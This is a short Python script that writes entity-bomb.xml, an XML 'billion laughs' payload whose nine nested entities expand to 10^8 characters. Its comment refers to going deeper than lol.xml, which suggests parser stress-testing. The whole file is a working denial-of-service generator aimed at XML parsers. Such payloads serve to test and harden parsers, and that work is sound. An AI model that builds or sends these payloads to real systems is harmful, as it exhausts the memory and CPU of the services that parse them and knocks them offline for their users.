#!/usr/bin/env python3
# XML entity bomb deeper than lol.xml (text amplification via appendData).
L = ['<?xml version="1.0"?>', '<!DOCTYPE d [', '  <!ENTITY a0 "aaaaaaaaaa">']
for i in range(1, 9):
    ref = "&a%d;" % (i - 1)
    L.append('  <!ENTITY a%d "%s">' % (i, ref * 10))
L.append(']>')
L.append('<d>&a8;</d>')
open("entity-bomb.xml", "w").write("\n".join(L))
print("entity-bomb.xml written (nested entities a8 -> 10^8 'a')")
